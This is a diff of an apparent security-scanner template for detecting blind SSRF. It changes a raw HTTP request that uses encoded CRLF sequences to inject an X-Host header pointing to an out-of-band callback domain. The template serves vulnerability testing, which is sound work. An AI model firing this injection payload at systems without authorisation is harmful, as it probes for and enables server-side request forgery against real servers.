@@ -1,4 +1,4 @@
-id: 153
+id: 273
 info:
   author: 0xAwali
   name: Blind SSRF
@@ -10,14 +10,14 @@ http:
     words:
     - Your Match
   raw:
-  - 'GET /%20HTTP/1.1\u560d\u560aX-Forwarded-For:%20{{Host}}.{{Port}}.BSSRF-099.{{MY-DOMAIN}}\u560d\u560a\u560d\u560a
+  - 'GET /%20HTTP/1.1%3F%0DX-Host:%20{{Host}}.{{Port}}.BSSRF-111.{{MY-DOMAIN}}%3F%0D%3F%0D
     HTTP/1.1
 
     Host: {{Hostname}}
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-
     Cache-Control: no-transform
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
     Accept-Encoding: gzip, deflate
 
